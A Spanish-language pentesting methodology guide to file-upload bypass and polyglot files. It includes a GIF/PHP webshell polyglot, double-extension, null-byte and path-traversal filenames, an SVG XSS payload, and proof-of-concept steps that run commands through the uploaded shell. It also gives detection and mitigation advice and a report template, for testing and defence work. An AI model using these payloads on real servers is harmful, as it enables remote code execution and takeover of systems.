# File Upload Bypass y Polyglots – Guía Completa

## Resumen

El upload bypass consiste en saltarse las validaciones de carga de archivos para subir contenido malicioso (webshells, RCE, scripts) al servidor. Los *polyglots* son archivos que cumplen con varios formatos/validaciones a la vez, pasando controles anti-abuso y permitiendo ejecución code, LFI o explotación encadenada. Es una vía recurrente para la toma de control total del sistema.

## Contexto

Aplicaciones web modernas permiten la carga de archivos para imágenes, documentos, o multimedia. Para evitar ataques, suelen implementar validación por extensión, tipo MIME, o inspección de firmas. Sin embargo, validaciones incompletas pueden ser engañadas por bypass de extensión, payloads embebidos, o headers manipulados (polyglot). Combinando técnicas es común obtener ejecución de código (RCE), XSS, LFI, SSRF o persistencia encubierta.

## Metodología

### 1. Identificación de Superficies de Upload

- Formularios de carga (`input type="file"`)
- APIs REST/GraphQL (`POST /upload`, multipart/form-data)
- Endpoints de perfil, avatar, reportes y adjuntos
- Automatización: usar ffuf, Burp, ParamSpider para mapear rutas /upload, /avatar, /profile-pic

### 2. Técnicas Comunes de Bypass

#### 2.1 Bypass de Extensión

- Doble extensión: `shell.php.jpg`, `cmd.asp;.jpg`
- Extensiones Unicode: `shell.php%00.jpg`, `file.php%20`
- MIME spoofing: enviar `Content-Type: image/jpeg` pero payload PHP

#### 2.2 Bypass de Tipo MIME

- Manipular encabezados en multipart:

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif
```

- Cambiar Content-Type por `application/octet-stream`, o el requerido

#### 2.3 Polyglots

- Payloads válidos para varios contextos. Ejemplo:
  - GIF89a; luego código PHP (permitido subir imagen, pero ejecuta PHP si es procesado por el servidor)

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

- PDF con JS o PHP oculto
- ZIP con webshell y files legítimos ("Double extension inside ZIP")

#### 2.4 Bypass de Filtros de Contenido

- Codificar payload (`base64`, `URL encode`)
- Fragmentar código entre múltiples líneas/comentarios
- Null Byte (`%00`) para truncar validaciones en lenguajes antiguos

#### 2.5 Path Traversal en Upload

- Manipular el nombre del archivo:
  `../../../../var/www/html/shell.php`
- Bypass por Windows/Unix separator:
  `..\\..\\..\\webroot\\shell.php`

### 3. Ejemplos Detallados

#### Case 1: PHP Webshell Polyglot (GIF)

Archivo `shell.php`

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

Subido y accedido vía: `/uploads/shell.php?cmd=id`

#### Case 2: Double Extension \& Trailing Dot

`shell.php.jpg.`

- Servidor puede truncar la extensión final.

#### Case 3: SVG XSS Polyglot

Archivo SVG con payload JS ejecutable:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[alert(document.domain)]]></script>
</svg>
```

Si es servida con Content-Type SVG, ejecuta JS.

## Herramientas y Automatización

- **Burp Suite Extensiones**: "Upload Scanner", "File Upload Attack"
- **ffuf**:

```bash
ffuf -u "https://victima.com/upload" -w bypass-list.txt -t 10 -H "Content-Type: multipart/form-data"
```

- **PayloadsAllTheThings**: sección “Upload Polyglots”
- **PolyglotGenerator.js**: https://github.com/cujanovic/PolyglotGenerator

## PoC Manual

1. Subir archivo `shell.php.jpg` con payload webshell.
2. Confirmar subida y ejecución mediante petición HTTP a `/uploads/shell.php?cmd=whoami`.
3. Probar variantes de extensión y nombre:
   - `shell.jpg.php%20`
   - `shell.asp;.jpg`
   - Archivos ZIP con files travesed
4. Si el upload almacena el archivo, revisar si es ejecutado como código o tratado como estático.

## Explotación Avanzada

- Polyglots para eludir WAF/AV (payloads válidos como PDF/GIF/ZIP/JPG pero ejecutan JS, PHP o comandos)
- Combinación con LFI: upload del archivo, luego exploitation con LFI en otro endpoint
- Persistencia: backdoor bajo nombre "inocente", firmado como imagen legítima

## Impacto

- **RCE**: Ejecución remota con privilegios del proceso web
- **Webshell persistente** para pivot y movimiento lateral
- **XSS/storage XSS** via SVG, PDF u otros formatos
- **Bypass AV/WAF**: Obsfuscación y firmas mixtas
- **SSRF/extensión**: si el archivo hace requests internos al ser ejecutado

## Detección

- Revisar rutas de upload en logs (`uploads/`, `/files/`, `/avatars/`) para extensiones inesperadas
- Extraer hashes/firma de archivos cargados
- Detectar doble extensión o scripts en ficheros binarios
- Listar uploads y buscar entropía anómala, presencia de marcas PHP/JS en imágenes

## Mitigación

1. **Whitelist de extensiones y MIME (servidor y cliente)**
2. **Renombrado y canonicalización** antes de guardar (no usar nombre original usuario)
3. **Almacenamiento fuera de webroot** (no ejecutable)
4. **Validación de contenido binario** (análisis de firma, no solo extensión/MIME)
5. **Deshabilitar ejecución en directorio de uploads**
6. **Escapado y sanitizado exhaustivo en preview/descarga**
7. **Principio de mínimo privilegio**: usuario web sin permisos escalados

## Errores Comunes

- Validar solo por extensión o MIME y no firmar contenido
- Permitir doble extensión o null byte truncation
- No limitar path o permitir traversal en uploads
- Almacenar uploads en webroot ejecutable

## Reporte

**Título:** Upload Bypass y Polyglot – Ejecución No Autorizada a Través de Archivos Maliciosos
**Resumen Ejecutivo:** El endpoint `/upload` permite la subida de archivos que pasan validaciones superficiales pero contienen código malicioso (polyglot), permitiendo ejecución remota (RCE) o XSS.
**Pasos de Reproducción:**

1. Subir archivo `shell.php.jpg` (o gif/php polyglot)
2. Acceder vía GET a `/uploads/shell.php?cmd=id`
3. Observar ejecución de comando
   **Mitigación Recomendada:** Whitelist, no ejecutar archivos subidos, analizar firma y almacenar fuera de webroot.
